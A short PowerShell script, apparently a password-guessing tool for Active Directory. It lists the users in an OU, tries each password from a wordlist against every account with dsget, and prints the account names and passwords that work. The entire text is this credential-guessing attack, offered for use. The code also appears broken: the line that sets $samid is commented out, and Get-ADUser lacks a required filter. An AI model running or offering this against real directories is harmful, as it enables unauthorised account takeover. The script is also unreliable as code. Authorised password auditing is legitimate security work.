# Update with your own OU, domain and password.
Get-ADUser -SearchBase “OU=myou,dc=test,dc=local” | Select distinguishedName | ConvertTo-Csv -NoTypeInformation | select -Skip 1 | Set-Content users.txt

foreach ($FQDN in Get-Content .\users.txt)
{
    $results = dsget user $FQDN -samid
    #$samid = $results[1].replace(" ", "")
    foreach ($password in Get-Content .\password.txt)
    {
        $password = $password.replace(" ", "")
        dsget user $FQDN -u $samid -p $password > $null
        if ($?) {
            Write-Host "Account: $samid; Password: $password"
                }
    }
}
